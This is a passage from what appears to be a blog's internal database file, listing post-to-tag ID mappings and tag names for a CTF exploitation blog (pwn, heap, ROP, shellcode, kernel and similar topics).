3h5oud2rvxftn8","tag_id":"clg9czah1008t5oud93u64k2z","_id":"clg9czah500a45oud0yav1aer"},{"post_id":"clg9czag300425ouda2894zlm","tag_id":"clg9czaev00055oud2txu0by7","_id":"clg9czah600a65oudduv52ao9"},{"post_id":"clg9czag300425ouda2894zlm","tag_id":"clg9czah1008x5oud0ycobdsg","_id":"clg9czah600a75oud9rj9ftys"},{"post_id":"clg9czag6004d5oudccnpfyyw","tag_id":"clg9czaev00055oud2txu0by7","_id":"clg9czah600a95ouddqqhdnc3"},{"post_id":"clg9czag6004d5oudccnpfyyw","tag_id":"clg9czah200905oudfj6h32ig","_id":"clg9czah600aa5oud1b1rdjjz"},{"post_id":"clg9czag6004d5oudccnpfyyw","tag_id":"clg9czaez000b5oud8a3g5rfy","_id":"clg9czah600ac5oud25750e8q"},{"post_id":"clg9czag6004g5oud4sqq3j5o","tag_id":"clg9czaev00055oud2txu0by7","_id":"clg9czah600ad5oud4z0kdgdg"},{"post_id":"clg9czag6004g5oud4sqq3j5o","tag_id":"clg9czagm00685oudfowfh8zk","_id":"clg9czah700af5oudbd1qh0w0"},{"post_id":"clg9czag7004k5oud0vvr222r","tag_id":"clg9czaev00055oud2txu0by7","_id":"clg9czah700ag5oudefil5704"},{"post_id":"clg9czag7004k5oud0vvr222r","tag_id":"clg9czaez000b5oud8a3g5rfy","_id":"clg9czah700ai5oud0c0v1eal"},{"post_id":"clg9czag7004k5oud0vvr222r","tag_id":"clg9czah200965oudat1388to","_id":"clg9czah700aj5oudbde3d6r2"},{"post_id":"clg9czag8004n5oud7q9cfl0p","tag_id":"clg9czaev00055oud2txu0by7","_id":"clg9czah700al5oud24b99lve"},{"post_id":"clg9czag8004n5oud7q9cfl0p","tag_id":"clg9czagm00685oudfowfh8zk","_id":"clg9czah700am5oud2bc3amzd"},{"post_id":"clg9czag8004n5oud7q9cfl0p","tag_id":"clg9czah0008n5oud90pofuyc","_id":"clg9czah700an5oud9usr8wo9"},{"post_id":"clg9czaga004u5oud9g306lqm","tag_id":"clg9czaev00055oud2txu0by7","_id":"clg9czah700ao5ouddbpz87ud"},{"post_id":"clg9czaga004u5oud9g306lqm","tag_id":"clg9czah200905oudfj6h32ig","_id":"clg9czah700ap5oudd7rugq24"},{"post_id":"clg9czaga004u5oud9g306lqm","tag_id":"clg9czah3009i5oudgiilhuyc","_id":"clg9czah800aq5oud71yvclyf"},{"post_id":"clg9czaga004x5oudcu6718ps","tag_id":"clg9czaev00055oud2txu0by7","_id":"clg9czah800ar5oud6ybi9d6n"},{"post_id":"clg9czaga004x5oudcu6718ps","tag_id":"clg9czah4009m5oudcz421at8","_id":"clg9czah800as5oud4sr4bah6"},{"post_id":"clg9czagb00515oudh9bhbhq3","tag_id":"clg9czaev00055oud2txu0by7","_id":"clg9czah800at5oud9qyvg21n"},{"post_id":"clg9czagb00515oudh9bhbhq3","tag_id":"clg9czagm00685oudfowfh8zk","_id":"clg9czah800au5oudh2osai6v"},{"post_id":"clg9czagb00515oudh9bhbhq3","tag_id":"clg9czah4009s5oud8edt1oyl","_id":"clg9czah800av5oudaq5u09xa"},{"post_id":"clg9czagc00545oud5ffshmru","tag_id":"clg9czaev00055oud2txu0by7","_id":"clg9czah800aw5oudg52sezrz"},{"post_id":"clg9czagc00545oud5ffshmru","tag_id":"clg9czafl00275oud7t6ba7r5","_id":"clg9czah800ax5oudfosug28z"},{"post_id":"clg9czagc00545oud5ffshmru","tag_id":"clg9czah4009v5oud2ibl6hnw","_id":"clg9czah800ay5oudayatbxin"},{"post_id":"clg9czagf005i5oud00y64ixw","tag_id":"clg9czaev00055oud2txu0by7","_id":"clg9czah800az5oud6yyva74b"},{"post_id":"clg9czagf005i5oud00y64ixw","tag_id":"clg9czaft00315oudcss6anp1","_id":"clg9czah800b05oud52wl6pm3"},{"post_id":"clg9czagf005i5oud00y64ixw","tag_id":"clg9czah5009y5oud0jrdcyrp","_id":"clg9czah800b15oude8gl743s"},{"post_id":"clg9czagg005m5oudgc3fes1u","tag_id":"clg9czaev00055oud2txu0by7","_id":"clg9czah800b25oud4xt725ti"},{"post_id":"clg9czagg005m5oudgc3fes1u","tag_id":"clg9czaft00315oudcss6anp1","_id":"clg9czah800b35oudh17t4m0r"},{"post_id":"clg9czagg005m5oudgc3fes1u","tag_id":"clg9czagm00685oudfowfh8zk","_id":"clg9czah800b45oudfi47d4hb"},{"post_id":"clg9czagi005t5oudhh9cargf","tag_id":"clg9czaev00055oud2txu0by7","_id":"clg9czah800b55oudd249cyhl"},{"post_id":"clg9czagi005t5oudhh9cargf","tag_id":"clg9czagi005s5oud24rv9j59","_id":"clg9czah800b65oud16s84r7p"},{"post_id":"clg9czagj005w5oud2ks1dlhs","tag_id":"clg9czaev00055oud2txu0by7","_id":"clg9czah800b75oud0352azp4"},{"post_id":"clg9czagj005w5oud2ks1dlhs","tag_id":"clg9czah0008n5oud90pofuyc","_id":"clg9czah800b85oudewjchfrc"},{"post_id":"clg9czagj005w5oud2ks1dlhs","tag_id":"clg9czah600ab5oudbdtq8d80","_id":"clg9czah800b95oudbp86h2p2"},{"post_id":"clg9czagj005z5oud0esfhwao","tag_id":"clg9czaev00055oud2txu0by7","_id":"clg9czah800ba5oudcdow78su"},{"post_id":"clg9czagj005z5oud0esfhwao","tag_id":"clg9czah600ae5oudbneran2l","_id":"clg9czah800bb5oud7ex41nnu"},{"post_id":"clg9czagl00635oudhouceg8s","tag_id":"clg9czaev00055oud2txu0by7","_id":"clg9czah800bc5oudftq6d9w8"},{"post_id":"clg9czagl00635oudhouceg8s","tag_id":"clg9czafg001n5oud53brcj49","_id":"clg9czah800bd5oudgsxt98bk"},{"post_id":"clg9czagl00635oudhouceg8s","tag_id":"clg9czagm00685oudfowfh8zk","_id":"clg9czah800be5oud2ofk7bme"},{"post_id":"clg9czagl00665oudcufm4ire","tag_id":"clg9czaev00055oud2txu0by7","_id":"clg9czah800bf5oudftvdg6yh"},{"post_id":"clg9czagl00665oudcufm4ire","tag_id":"clg9czaft00315oudcss6anp1","_id":"clg9czah800bg5ouddlf789w3"},{"post_id":"clg9czagl00665oudcufm4ire","tag_id":"clg9czagi005s5oud24rv9j59","_id":"clg9czah800bh5oud20atc4e0"},{"post_id":"clg9czagl00665oudcufm4ire","tag_id":"clg9czagv007p5oudh5ki530k","_id":"clg9czah800bi5oudbl5v15nt"}],"Tag":[{"name":"pwn","_id":"clg9czaev00055oud2txu0by7"},{"name":"heap","_id":"clg9czaez000b5oud8a3g5rfy"},{"name":"高版本glibc","_id":"clg9czaf2000g5oudghon85fs"},{"name":"House of xxx","_id":"clg9czaf4000m5oud3biq1zq7"},{"name":"house_of_xxx","_id":"clg9czafc00175oud3ofq57j2"},{"name":"arm","_id":"clg9czafg001n5oud53brcj49"},{"name":"c/s","_id":"clg9czafk00205oudbekc2q2b"},{"name":"re","_id":"clg9czafl00275oud7t6ba7r5"},{"name":"docker","_id":"clg9czafn002e5oud7hijhir1"},{"name":"fuzzing","_id":"clg9czafq002n5ouddwb11nzu"},{"name":"stackoverflow","_id":"clg9czaft00315oudcss6anp1"},{"name":"misc","_id":"clg9czafv00385oud3oga2uzj"},{"name":"IO_FILE","_id":"clg9czafw003g5ouddosvgt9i"},{"name":"index overflow","_id":"clg9czag2003x5oud3h37aos4"},{"name":"got overwrite","_id":"clg9czag6004b5oudas3i7owv"},{"name":"linux","_id":"clg9czag7004i5oud6s0kglfi"},{"name":"kernel","_id":"clg9czag9004q5oudhz2x5erw"},{"name":"protocol","_id":"clg9czagb004z5oud03xq4cbl"},{"name":"matlab","_id":"clg9czagd00565oud5y6p0ff9"},{"name":"数学建模","_id":"clg9czagf005d5oudewnw00rg"},{"name":"sandbox","_id":"clg9czagi005s5oud24rv9j59"},{"name":"ROP","_id":"clg9czagm00685oudfowfh8zk"},{"name":"栈迁移","_id":"clg9czago006f5oudbxof4zwa"},{"name":"ret2usr","_id":"clg9czagt00765oudhacq5e6g"},{"name":"rop","_id":"clg9czagu007d5oudfyg8hw3a"},{"name":"orw","_id":"clg9czagv007p5oudh5ki530k"},{"name":"Misc","_id":"clg9czagw007v5oud6hyg3fgu"},{"name":"linux_trick","_id":"clg9czagy008a5oudenx7bj6f"},{"name":"python","_id":"clg9czagy008e5oudhohlaq9h"},{"name":"race_condition","_id":"clg9czagz008k5oud4tyu1wc6"},{"name":"format","_id":"clg9czah0008n5oud90pofuyc"},{"name":"crypto","_id":"clg9czah1008t5oud93u64k2z"},{"name":"reverse","_id":"clg9czah1008x5oud0ycobdsg"},{"name":"musl","_id":"clg9czah200905oudfj6h32ig"},{"name":"House_of_xxx","_id":"clg9czah200965oudat1388to"},{"name":"index_overflow","_id":"clg9czah3009i5oudgiilhuyc"},{"name":"shellcode","_id":"clg9czah4009m5oudcz421at8"},{"name":"SROP","_id":"clg9czah4009s5oud8edt1oyl"},{"name":"ret2dlsolve","_id":"clg9czah4009v5oud2ibl6hnw"},{"name":"asm","_id":"clg9czah5009y5oud0jrdcyrp"},{"name":"DFS","_id":"clg9czah600ab5oudbdtq8d80"},{"name":"setcontext","_id":"clg9czah600ae5oudbneran2l"}]}}